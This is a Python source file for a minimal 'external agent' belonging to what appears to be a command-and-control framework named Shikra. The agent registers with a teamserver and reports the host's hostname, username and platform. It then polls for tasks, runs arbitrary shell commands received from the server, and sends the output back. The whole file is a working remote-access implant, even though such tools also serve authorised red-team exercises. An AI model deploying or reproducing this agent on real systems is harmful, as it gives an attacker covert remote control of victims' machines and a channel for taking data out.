#!/usr/bin/env python3
"""Minimal external agent for Shikra's ExternalC2 bridge.

Registers with the teamserver, long-polls for tasks, executes a small command
set locally and posts results back. Only the Python standard library is used.

Environment:
    SHIKRA_URL          teamserver HTTP base URL, e.g. https://10.0.0.1:8080
    SHIKRA_RELAY_TOKEN  relay token from <state_dir>/relay.token
    SHIKRA_CA_CERT      path to the teamserver CA (ca.pem) for TLS verification
    SHIKRA_INSECURE=1   skip TLS verification (lab use only)
"""

import json
import os
import platform
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request

BASE = os.environ.get("SHIKRA_URL", "").rstrip("/")
RELAY_TOKEN = os.environ.get("SHIKRA_RELAY_TOKEN", "")
CA_CERT = os.environ.get("SHIKRA_CA_CERT", "")
POLL_INTERVAL = float(os.environ.get("SHIKRA_POLL_SECS", "2"))


def tls_context():
    if os.environ.get("SHIKRA_INSECURE") == "1":
        return ssl._create_unverified_context()
    if CA_CERT:
        return ssl.create_default_context(cafile=CA_CERT)
    return ssl.create_default_context()


CONTEXT = tls_context()


def request(method, path, token, payload=None):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("Authorization", "Bearer " + token)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, context=CONTEXT, timeout=60) as response:
        body = response.read()
        return json.loads(body) if body else None


def execute(task):
    kind = task.get("kind", "")
    args = task.get("args") or {}
    if kind == "echo":
        return 0, str(args.get("message", args)).encode(), ""
    if kind == "shell":
        command = args.get("command", "")
        completed = subprocess.run(
            command, shell=True, capture_output=True, timeout=300
        )
        return completed.returncode, completed.stdout, completed.stderr.decode(errors="replace")
    return -1, b"", f"external agent does not implement {kind!r}"


def main():
    if not BASE or not RELAY_TOKEN:
        print("SHIKRA_URL and SHIKRA_RELAY_TOKEN are required", file=sys.stderr)
        return 1
    machine = platform.machine()
    architecture = "aarch64" if machine in ("arm64", "aarch64") else "x86_64"
    system = platform.system().lower()
    platform_name = {"darwin": "macos", "windows": "windows"}.get(system, "linux")

    registration = request(
        "POST",
        "/api/v1/external/register",
        RELAY_TOKEN,
        {
            "hostname": platform.node(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "platform": platform_name,
            "architecture": architecture,
            "process_name": "external-agent.py",
        },
    )
    session_id = registration["session_id"]
    session_token = registration["session_token"]
    print(f"[+] registered external session {session_id}")

    while True:
        try:
            batch = request("GET", f"/api/v1/external/{session_id}/tasks", session_token)
        except urllib.error.HTTPError as error:
            print(f"[!] task fetch failed: {error}", file=sys.stderr)
            time.sleep(POLL_INTERVAL * 5)
            continue
        except Exception as error:  # noqa: BLE001 - keep the loop alive
            print(f"[!] transport error: {error}", file=sys.stderr)
            time.sleep(POLL_INTERVAL)
            continue

        tasks = (batch or {}).get("tasks", [])
        if not tasks:
            time.sleep(POLL_INTERVAL)
            continue
        results = []
        for task in tasks:
            exit_code, stdout, stderr = execute(task)
            results.append(
                {
                    "task_id": task["task_id"],
                    "exit_code": exit_code,
                    "stdout_hex": stdout.hex(),
                    "stderr": stderr,
                }
            )
        try:
            request("POST", f"/api/v1/external/{session_id}/results", session_token, results)
        except Exception as error:  # noqa: BLE001
            print(f"[!] result submission failed: {error}", file=sys.stderr)


if __name__ == "__main__":
    raise SystemExit(main())
